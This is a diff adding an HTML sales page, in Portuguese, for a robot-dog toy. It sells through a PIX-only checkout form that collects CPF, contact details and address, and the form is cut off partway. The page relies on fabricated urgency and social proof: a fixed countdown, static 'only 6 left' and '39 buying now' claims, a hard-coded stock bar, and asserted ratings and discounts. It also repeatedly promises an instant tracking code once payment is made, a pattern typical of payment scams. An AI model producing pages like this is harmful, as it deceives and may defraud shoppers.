@@ -1,0 +1,1464 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cachorro Robô Inteligente Smart Pet Dogbot - Oferta de Natal</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #ff6b00;
+            --accent-blue: #0077ff;
+            --secondary-color: #0f172a;
+            --bg-color: #f4f7fb;
+            --card-bg: #ffffff;
+            --text-color: #1e293b;
+            --text-muted: #64748b;
+            --success: #10b981;
+            --success-dark: #059669;
+            --border-color: #e2e8f0;
+            --radius-lg: 16px;
+            --radius-md: 12px;
+            --shadow-sm: 0 2px 8px rgba(15, 23, 42, 0.06);
+            --shadow-md: 0 10px 30px rgba(15, 23, 42, 0.08);
+            --shadow-lg: 0 20px 40px rgba(15, 23, 42, 0.14);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding-bottom: 85px;
+        }
+
+        /* --- Barra de Urgência Natalina --- */
+        .timer-bar {
+            background: linear-gradient(90deg, #991b1b, #dc2626, #15803d);
+            border-bottom: 2px solid #fde047;
+            color: #ffffff;
+            padding: 10px 15px;
+            font-weight: 700;
+            font-size: 0.88rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            text-align: center;
+        }
+
+        .timer-countdown {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 3px 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 1.15rem;
+            color: #fde047;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+        }
+
+        header {
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(10px);
+            padding: 14px 20px;
+            box-shadow: var(--shadow-sm);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .header-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-weight: 900;
+            font-size: 1.35rem;
+            color: var(--secondary-color);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logo span { color: var(--accent-blue); }
+
+        .xmas-header-pill {
+            background: linear-gradient(135deg, #dc2626, #b91c1c);
+            color: #ffffff;
+            font-size: 0.72rem;
+            font-weight: 800;
+            padding: 4px 10px;
+            border-radius: 20px;
+            box-shadow: 0 2px 8px rgba(220, 38, 38, 0.3);
+        }
+
+        .header-badges {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        @media (max-width: 768px) {
+            .header-badges { display: none; }
+        }
+
+        /* --- Container Principal --- */
+        .container {
+            max-width: 1140px;
+            margin: 28px auto;
+            padding: 0 16px;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 32px;
+        }
+
+        @media (min-width: 880px) {
+            .container {
+                grid-template-columns: 1.05fr 0.95fr;
+                align-items: start;
+            }
+        }
+
+        /* --- Galeria Interativa --- */
+        .gallery-wrapper {
+            background: var(--card-bg);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        @media (min-width: 880px) {
+            .gallery-wrapper {
+                position: sticky;
+                top: 85px;
+            }
+        }
+
+        .badge-floating {
+            position: absolute;
+            top: 32px;
+            left: 32px;
+            background: linear-gradient(135deg, #dc2626, #b91c1c);
+            color: white;
+            font-size: 0.78rem;
+            font-weight: 800;
+            padding: 6px 14px;
+            border-radius: 30px;
+            z-index: 10;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.4);
+            border: 1px solid #fde047;
+            text-transform: uppercase;
+        }
+
+        .badge-discount-floating {
+            position: absolute;
+            top: 32px;
+            right: 32px;
+            background: #ef4444;
+            color: white;
+            font-size: 0.82rem;
+            font-weight: 800;
+            padding: 6px 12px;
+            border-radius: 30px;
+            z-index: 10;
+        }
+
+        .main-image-box {
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 14px;
+            border: 1px solid #f1f5f9;
+        }
+
+        .main-image-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            transition: transform 0.35s ease, opacity 0.2s ease;
+        }
+
+        .main-image-box:hover img {
+            transform: scale(1.04);
+        }
+
+        .thumbnails-row {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+        }
+
+        .thumb-item {
+            aspect-ratio: 1 / 1;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 2px solid var(--border-color);
+            cursor: pointer;
+            padding: 4px;
+            background: #fff;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .thumb-item:hover {
+            border-color: #94a3b8;
+            transform: translateY(-2px);
+        }
+
+        .thumb-item.active {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(0, 119, 255, 0.2);
+        }
+
+        .thumb-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 6px;
+        }
+
+        .thumb-real-badge {
+            position: absolute;
+            bottom: 3px;
+            left: 3px;
+            right: 3px;
+            background: rgba(15, 23, 42, 0.88);
+            color: #fde047;
+            font-size: 0.6rem;
+            font-weight: 800;
+            text-align: center;
+            padding: 2px;
+            border-radius: 3px;
+            pointer-events: none;
+        }
+
+        /* --- Detalhes do Produto --- */
+        .product-details {
+            background: var(--card-bg);
+            padding: 28px;
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-md);
+            border: 1px solid var(--border-color);
+        }
+
+        .product-meta-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .tag-category {
+            background: #fef2f2;
+            color: #dc2626;
+            font-weight: 800;
+            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 6px;
+            border: 1px solid #fecaca;
+            text-transform: uppercase;
+        }
+
+        .rating-summary {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.86rem;
+            font-weight: 600;
+            color: var(--text-color);
+        }
+
+        .stars { color: #f59e0b; }
+
+        h1 {
+            font-size: 1.65rem;
+            line-height: 1.28;
+            margin-bottom: 10px;
+            color: var(--secondary-color);
+            font-weight: 800;
+        }
+
+        .product-subtitle {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 16px;
+        }
+
+        /* Callout de Natal */
+        .xmas-gift-callout {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, #fff1f2, #fefce8);
+            border: 1px solid #fecdd3;
+            border-left: 4px solid #dc2626;
+            padding: 12px 14px;
+            border-radius: 10px;
+            margin-bottom: 16px;
+            font-size: 0.85rem;
+            color: #881337;
+            line-height: 1.45;
+        }
+
+        .xmas-gift-icon {
+            font-size: 1.8rem;
+            flex-shrink: 0;
+        }
+
+        /* Preço Exclusivo PIX */
+        .price-card {
+            background: linear-gradient(145deg, #f8fafc, #f0fdf4);
+            border: 1px solid #bbf7d0;
+            padding: 16px 20px;
+            border-radius: var(--radius-md);
+            margin-bottom: 16px;
+        }
+
+        .price-row-old {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .old-price {
+            text-decoration: line-through;
+            color: #94a3b8;
+            font-size: 0.98rem;
+        }
+
+        .save-pill {
+            background: #dcfce7;
+            color: #15803d;
+            font-size: 0.74rem;
+            font-weight: 800;
+            padding: 2px 8px;
+            border-radius: 6px;
+        }
+
+        .current-price-row {
+            display: flex;
+            align-items: baseline;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 4px 0;
+        }
+
+        .current-price {
+            color: var(--success-dark);
+            font-size: 2.35rem;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+
+        .pix-badge {
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: var(--success-dark);
+            background: #d1fae5;
+            padding: 3px 8px;
+            border-radius: 6px;
+        }
+
+        /* Banner de Garantia do Rastreio Antecipado */
+        .tracking-guarantee-banner {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            background: linear-gradient(135deg, #eff6ff, #f0fdf4);
+            border: 2px solid #38bdf8;
+            padding: 14px 16px;
+            border-radius: 12px;
+            margin-bottom: 18px;
+        }
+
+        .tracking-guarantee-icon {
+            font-size: 1.8rem;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+
+        .tracking-guarantee-banner strong {
+            display: block;
+            color: #0369a1;
+            font-size: 0.88rem;
+            margin-bottom: 3px;
+        }
+
+        .tracking-guarantee-banner p {
+            font-size: 0.82rem;
+            color: #1e293b;
+            line-height: 1.4;
+        }
+
+        /* Barra de Estoque */
+        .stock-box {
+            margin-bottom: 18px;
+            background: #fff7ed;
+            border: 1px solid #fed7aa;
+            padding: 12px 14px;
+            border-radius: 10px;
+        }
+
+        .stock-text {
+            font-size: 0.82rem;
+            color: #c2410c;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .stock-bar-bg {
+            width: 100%;
+            height: 8px;
+            background: #ffedd5;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .stock-bar-fill {
+            width: 88%;
+            height: 100%;
+            background: linear-gradient(90deg, #f97316, #ef4444);
+            border-radius: 10px;
+        }
+
+        .highlights-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin: 16px 0;
+        }
+
+        .highlight-chip {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 0.84rem;
+            font-weight: 600;
+            color: var(--secondary-color);
+        }
+
+        .features-list {
+            list-style: none;
+            margin: 16px 0;
+            font-size: 0.9rem;
+            color: #334155;
+        }
+
+        .features-list li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .features-list li::before {
+            content: "✓";
+            background: #dcfce7;
+            color: var(--success-dark);
+            font-weight: 900;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.76rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .btn-buy {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 18px 24px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            text-align: center;
+            font-size: 1.12rem;
+            font-weight: 800;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-transform: uppercase;
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.35);
+        }
+
+        .btn-buy:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(16, 185, 129, 0.45);
+        }
+
+        .trust-badges {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 18px;
+            padding-top: 16px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            font-size: 0.76rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        /* --- Modal Checkout e Rastreio --- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.78);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 26px;
+            border-radius: var(--radius-lg);
+            width: 100%;
+            max-width: 580px;
+            text-align: center;
+            position: relative;
+            box-shadow: var(--shadow-lg);
+            max-height: 92vh;
+            overflow-y: auto;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 1.7rem;
+            cursor: pointer;
+            color: #94a3b8;
+            line-height: 1;
+        }
+
+        .checkout-steps-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #94a3b8;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+
+        .checkout-steps-bar span.active { color: var(--accent-blue); }
+        .checkout-steps-bar span.done { color: var(--success-dark); }
+
+        .modal-product-summary {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            padding: 10px 12px;
+            border-radius: 10px;
+            margin: 12px 0;
+            text-align: left;
+        }
+
+        .modal-product-summary img {
+            width: 52px;
+            height: 52px;
+            border-radius: 8px;
+            object-fit: cover;
+        }
+
+        .tracking-pre-notice {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #eff6ff;
+            border: 1px solid #93c5fd;
+            border-left: 4px solid #0077ff;
+            padding: 10px 12px;
+            border-radius: 8px;
+            text-align: left;
+            font-size: 0.82rem;
+            color: #1e3a8a;
+            margin: 10px 0;
+        }
+
+        .form-section-subtitle {
+            text-align: left;
+            font-size: 0.84rem;
+            font-weight: 800;
+            color: #0f172a;
+            padding-bottom: 6px;
+            margin: 10px 0 6px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .form-group {
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: var(--secondary-color);
+            margin-bottom: 3px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 8px;
+            border: 1px solid #cbd5e1;
+            font-size: 0.9rem;
+        }
+
+        .form-row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .form-row-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+        }
+
+        @media (max-width: 540px) {
+            .form-row-2, .form-row-3 { grid-template-columns: 1fr; }
+            .form-row-3 .span-2 { grid-column: span 1 !important; }
+        }
+
+        .qr-placeholder {
+            width: 215px;
+            height: 215px;
+            background: #ffffff;
+            margin: 14px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 8px;
+        }
+
+        .pix-code-box {
+            background: #f1f5f9;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 0.76rem;
+            margin-bottom: 14px;
+            max-height: 60px;
+            overflow-y: auto;
+            border: 1px solid var(--border-color);
+            color: #334155;
+            user-select: all;
+        }
+
+        .btn-copy {
+            background: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 13px 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 800;
+            font-size: 0.9rem;
+        }
+
+        .tracking-pix-warning {
+            background: #fefce8;
+            border: 1px solid #fde047;
+            border-left: 4px solid #eab308;
+            padding: 10px 12px;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            color: #713f12;
+            text-align: left;
+            margin: 10px 0;
+            line-height: 1.4;
+        }
+
+        .realtime-status-box {
+            margin-top: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            color: var(--success-dark);
+            font-weight: 700;
+        }
+
+        .pulse-dot {
+            width: 9px;
+            height: 9px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulseAnim 1.4s infinite;
+        }
+
+        @keyframes pulseAnim {
+            0% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
+            100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        /* --- Barra Fixa Inferior Sticky CTA --- */
+        .sticky-cta-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid var(--border-color);
+            padding: 10px 16px;
+            z-index: 90;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        .sticky-cta-inner {
+            max-width: 1140px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 15px;
+        }
+
+        .sticky-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sticky-info img {
+            width: 46px;
+            height: 46px;
+            border-radius: 8px;
+            object-fit: cover;
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-sticky-buy {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            font-weight: 800;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.92rem;
+            white-space: nowrap;
+        }
+
+        /* --- Seção de Rastreio Pós-Pagamento --- */
+        .tracking-code-box {
+            background: linear-gradient(145deg, #f8fafc, #f0fdf4);
+            border: 2px dashed #059669;
+            border-radius: 14px;
+            padding: 20px;
+            margin: 15px auto;
+        }
+
+        .tracking-code-number {
+            font-family: monospace;
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: #0f172a;
+            letter-spacing: 3px;
+            margin: 8px 0 12px;
+        }
+
+        /* Toast Prova Social */
+        .toast-container {
+            position: fixed;
+            bottom: 82px;
+            left: 20px;
+            z-index: 999;
+        }
+
+        .toast {
+            background: white;
+            padding: 12px 16px;
+            border-radius: 12px;
+            box-shadow: var(--shadow-md);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-left: 4px solid var(--success);
+            font-size: 0.82rem;
+            max-width: 320px;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(-110%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px 20px;
+            background: #0f172a;
+            color: #94a3b8;
+            font-size: 0.85rem;
+            margin-top: 60px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Barra de Urgência Natalina -->
+    <div class="timer-bar">
+        <span>🎄 OFERTA DE NATAL NO PIX POR R$ 99,90 + CÓDIGO DE RASTREIO LIBERADO NA HORA! ENCERRA EM:</span>
+        <span class="timer-countdown" id="countdown">14:59</span>
+    </div>
+
+    <!-- Header -->
+    <header>
+        <div class="header-inner">
+            <div class="logo">
+                🤖 SMART<span>PET</span> BRASIL <span class="xmas-header-pill">🎅 Especial de Natal</span>
+            </div>
+            <div class="header-badges">
+                <span>📦 Rastreio Imediato</span>
+                <span>⚡ Pagamento 100% via PIX</span>
+                <span>🛡️ Garantia Oficial</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="container">
+        <!-- Galeria Interativa com Fotos Reais -->
+        <div class="gallery-wrapper">
+            <div class="badge-floating">🎄 #1 Presente de Natal</div>
+            <div class="badge-discount-floating">-67% OFF NO PIX</div>
+
+            <div class="main-image-box">
+                <img id="mainProductImg" src="img/D_NQ_NP_2X_705712-MLA101785533767_122025-F.webp" alt="Cachorro Robô Inteligente Smart Pet Dogbot">
+            </div>
+
+            <div class="thumbnails-row">
+                <div class="thumb-item active" onclick="changeImage(this, 'img/D_NQ_NP_2X_705712-MLA101785533767_122025-F.webp')">
+                    <img src="img/D_NQ_NP_2X_705712-MLA101785533767_122025-F.webp" alt="Dogbot + Controle Remoto">
+                </div>
+                <div class="thumb-item" onclick="changeImage(this, 'img/foto-real-cliente-dogbot.jpg')">
+                    <img src="img/foto-real-cliente-dogbot.jpg" alt="Foto Real na Caixa Original">
+                    <span class="thumb-real-badge">📸 Real</span>
+                </div>
+                <div class="thumb-item" onclick="changeImage(this, 'img/D_NQ_NP_2X_619845-MLA101284980262_122025-F.webp')">
+                    <img src="img/D_NQ_NP_2X_619845-MLA101284980262_122025-F.webp" alt="Diversão em Família">
+                </div>
+                <div class="thumb-item" onclick="changeImage(this, 'img/D_NQ_NP_2X_787396-MLA101785702473_122025-F.webp')">
+                    <img src="img/D_NQ_NP_2X_787396-MLA101785702473_122025-F.webp" alt="Comandos de Voz e Programação">
+                </div>
+                <div class="thumb-item" onclick="changeImage(this, 'img/D_NQ_NP_2X_947499-MLA101284980250_122025-F.webp')">
+                    <img src="img/D_NQ_NP_2X_947499-MLA101284980250_122025-F.webp" alt="Smart Chip e Dimensões">
+                </div>
+            </div>
+        </div>
+
+        <!-- Coluna de Compra -->
+        <div class="product-details">
+            <div class="product-meta-top">
+                <span class="tag-category">🎁 O Presente Mais Desejado de 2026</span>
+                <div class="rating-summary">
+                    <span class="stars">★★★★★</span>
+                    <span>4.9 (348 feedbacks) | +1.200 vendidos</span>
+                </div>
+            </div>
+
+            <h1>Cachorro Robô Inteligente Smart Pet Dogbot Cachorro Colorido</h1>
+            <p class="product-subtitle">
+                🎄 <strong>O Presente de Natal #1 de 2026!</strong> O pet tecnológico que encanta crianças e adultos com controle por voz, aplicativo Bluetooth e controle remoto.
+            </p>
+
+            <div class="xmas-gift-callout">
+                <div class="xmas-gift-icon">🎅</div>
+                <div>
+                    <strong>Liquidação Antecipada de Natal Exclusiva no PIX!</strong> Garanta hoje o presente perfeito na <strong>caixa original colecionável</strong> por apenas <strong>R$ 99,90</strong> com Frete Grátis Expresso!
+                </div>
+            </div>
+
+            <!-- Card de Preço Exclusivo PIX -->
+            <div class="price-card">
+                <div class="price-row-old">
+                    <span class="old-price">De R$ 299,90</span>
+                    <span class="save-pill">ECONOMIZE R$ 200,00 (67% OFF)</span>
+                </div>
+                <div class="current-price-row">
+                    <span class="current-price">R$ 99,90</span>
+                    <span class="pix-badge">EXCLUSIVO VIA PIX</span>
+                </div>
+                <div style="font-weight: 700; color: #0f172a; font-size: 0.88rem; margin-top: 4px;">
+                    ✓ Pagamento Único via PIX SyncPay • <strong>Código de Rastreio Liberado na Hora!</strong>
+                </div>
+            </div>
+
+            <!-- Aviso Claro do Rastreio Antecipado -->
+            <div class="tracking-guarantee-banner">
+                <div class="tracking-guarantee-icon">📦</div>
+                <div>
+                    <strong>CÓDIGO DE RASTREIO LIBERADO NA HORA!</strong>
+                    <p>
+                        Ao clicar em comprar, você informará seu endereço de entrega. <strong>Assim que realizar o pagamento do PIX, uma nova página abrirá automaticamente na sua tela com o seu Código de Rastreio!</strong>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Barra de Estoque -->
+            <div class="stock-box">
+                <div class="stock-text">
+                    <span>🔥 Lote Especial de Natal: 39 pais comprando agora</span>
+                    <span>Restam 6 unidades!</span>
+                </div>
+                <div class="stock-bar-bg">
+                    <div class="stock-bar-fill"></div>
+                </div>
+            </div>
+
+            <!-- Chips de Recursos -->
+            <div class="highlights-grid">
+                <div class="highlight-chip">
+                    <span>🎙️</span>
+                    <span>Voz + App + Controle</span>
+                </div>
+                <div class="highlight-chip">
+                    <span>📡</span>
+                    <span>Bluetooth até 25m</span>
+                </div>
+                <div class="highlight-chip">
+                    <span>🧠</span>
+                    <span>Rotinas Programáveis</span>
+                </div>
+                <div class="highlight-chip">
+                    <span>🔋</span>
+                    <span>Recarga Rápida USB-C</span>
+                </div>
+            </div>
+
+            <ul class="features-list">
+                <li><strong>📦 Rastreio Liberado na Hora:</strong> Após pagar o PIX, a página com seu Código de Rastreio abre automaticamente!</li>
+                <li><strong>🎁 Caixa Original Pronta para Presentear:</strong> Surpreenda na árvore de Natal com o brinquedo mais desejado do ano!</li>
+                <li><strong>Acrobacias Incríveis:</strong> Dança, faz Kung Fu, patrulha, senta, fica em 2 patas e até "faz xixi" de brincadeira!</li>
+                <li><strong>Chip Inteligente + USB-C:</strong> Movimentos fluidos em até 25 metros e bateria recarregável.</li>
+            </ul>
+
+            <!-- Botão Comprar -->
+            <button class="btn-buy" onclick="openModal()">
+                <span>🎄 COMPRAR NO PIX POR R$ 99,90 + RECEBER RASTREIO NA HORA</span>
+            </button>
+
+            <div class="trust-badges">
+                <div class="trust-item">
+                    <span>⚡</span>
+                    <div>Pagamento Único<br><strong>100% via PIX SyncPay</strong></div>
+                </div>
+                <div class="trust-item">
+                    <span>📦</span>
+                    <div>Página de Rastreio<br><strong>Abre Após Pagar</strong></div>
+                </div>
+                <div class="trust-item">
+                    <span>👶</span>
+                    <div>Recomendado<br><strong>a partir de 3 anos</strong></div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Barra Fixa Inferior Sticky CTA -->
+    <div class="sticky-cta-bar">
+        <div class="sticky-cta-inner">
+            <div class="sticky-info">
+                <img src="img/D_NQ_NP_2X_705712-MLA101785533767_122025-F.webp" alt="Smart Pet Dogbot">
+                <div>
+                    <div style="font-weight: 800; font-size: 0.9rem; color: #0f172a;">🎄 Presente de Natal: Cachorro Robô Smart Pet Dogbot</div>
+                    <div style="font-weight: 800; font-size: 1.02rem; color: #059669;">
+                        R$ 99,90 Exclusivo no PIX <span style="font-size:0.76rem; color:#64748b; font-weight:normal;">(📦 Rastreio Abre na Hora!)</span>
+                    </div>
+                </div>
+            </div>
+            <button class="btn-sticky-buy" onclick="openModal()">🎄 COMPRAR NO PIX • R$ 99,90</button>
+        </div>
+    </div>
+
+    <!-- Modal PIX Dinâmico com SyncPay + Endereço + Rastreio -->
+    <div class="modal-overlay" id="pixModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+
+            <!-- Indicador de Etapas -->
+            <div class="checkout-steps-bar">
+                <span id="stepTab1" class="active">1. Dados & Endereço</span>
+                <span>→</span>
+                <span id="stepTab2">2. Pagamento PIX</span>
+                <span>→</span>
+                <span id="stepTab3">3. Página de Rastreio</span>
+            </div>
+
+            <!-- ETAPA 1: Formulário Completo de Destinatário e Endereço -->
+            <div id="checkoutFormStep">
+                <h2 style="color: var(--secondary-color); font-size: 1.3rem;">Onde Devemos Entregar Seu Dogbot?</h2>
+
+                <div class="tracking-pre-notice">
+                    <span style="font-size: 1.6rem;">📦</span>
+                    <div>
+                        <strong>LIBERAÇÃO IMEDIATA DO RASTREIO:</strong> Preencha seu endereço abaixo. Assim que você pagar o PIX de <strong>R$ 99,90</strong>, esta tela abrirá <strong>automaticamente a página oficial com o seu CÓDIGO DE RASTREIO</strong>!
+                    </div>
+                </div>
+
+                <div class="modal-product-summary">
+                    <img src="img/D_NQ_NP_2X_705712-MLA101785533767_122025-F.webp" alt="Smart Pet Dogbot">
+                    <div>
+                        <div style="font-size: 0.85rem; font-weight: 800; color: var(--secondary-color);">Cachorro Robô Smart Pet Dogbot (Caixa Original)</div>
+                        <div style="font-size: 0.82rem; color: var(--success-dark); font-weight: 800;">Valor Único no PIX: R$ 99,90 • Frete Grátis Expresso</div>
+                    </div>
+                </div>
+
+                <form id="paymentForm" onsubmit="handleGeneratePix(event)">
+                    <div class="form-section-subtitle">👤 1. Dados do Destinatário</div>
+
+                    <div class="form-row-2">
+                        <div class="form-group">
+                            <label>Nome Completo *</label>
+                            <input type="text" id="clientName" class="form-input" required placeholder="Ex: Maria da Silva">
+                        </div>
+                        <div class="form-group">
+                            <label>CPF (para Nota Fiscal e Rastreio) *</label>
+                            <input type="text" id="clientCpf" class="form-input" required placeholder="000.000.000-00" maxlength="14" oninput="maskCpf(this)">
+                        </div>
+                    </div>
+
+                    <div class="form-row-2">
+                        <div class="form-group">
+                            <label>E-mail *</label>
+                            <input type="email" id="clientEmail" class="form-input" required placeholder="seu@email.com">
+                        </div>
+                        <div class="form-group">
+                            <label>WhatsApp / Celular *</label>
+                            <input type="tel" id="clientPhone" class="form-input" required placeholder="(11) 99999-9999" maxlength="15" oninput="maskPhone(this)">
+                        </div>
+                    </div>
+
+                    <div class="form-section-subtitle">📍 2. Endereço de Entrega <small id="cepStatus" style="color:var(--accent-blue); display:none;">(Buscando CEP...)</small></div>
+
+                    <div class="form-row-3">
+                        <div class="form-group">
+                            <label>CEP *</label>
+                            <input type="text" id="addressCep" class="form-input" required placeholder="00000-000" maxlength="9" oninput="maskCep(this)">
+                        </div>
+                        <div class="form-group span-2" style="grid-column: span 2;">
+                            <label>Rua / Avenida *</label>
+                            <input type="text" id="addressStreet" class="form-input" required placeholder="Nome da rua ou avenida">
+                        </div>
+                    </div>
+
+                    <div class="form-row-3">
+                        <div class="form-group">
+                            <label>Número *</label>
+                            <input type="text" id="addressNumber" class="form-input" required placeholder="Nº">
+                        </div>
+                        <div class="form-group">
+                            <label>Complemento</label>
+                            <input type="text" id="addressComplement" class="form-input" placeholder="Apto, Bloco, Casa">
+                        </div>
+                        <div class="form-group">
+                            <label>Bairro *</label>
+                            <input type="text" id="addressNeighborhood" class="form-input" required placeholder="Seu bairro">
+                        </div>
+                    </div>
+
+                    <div class="form-row-3">
+                        <div class="form-group span-2" style="grid-column: span 2;">
+                            <label>Cidade *</label>
+                            <input type="text" id="addressCity" class="form-input" required placeholder="Sua cidade">
+                        </div>
+                        <div class="form-group">
+                            <label>Estado (UF) *</label>
+                            <input type="text" id="addressState" class="form-input" required maxlength="2" placeholder="SP" style="text-transform:uppercase;">
+                        </div>
+                    </div>
+
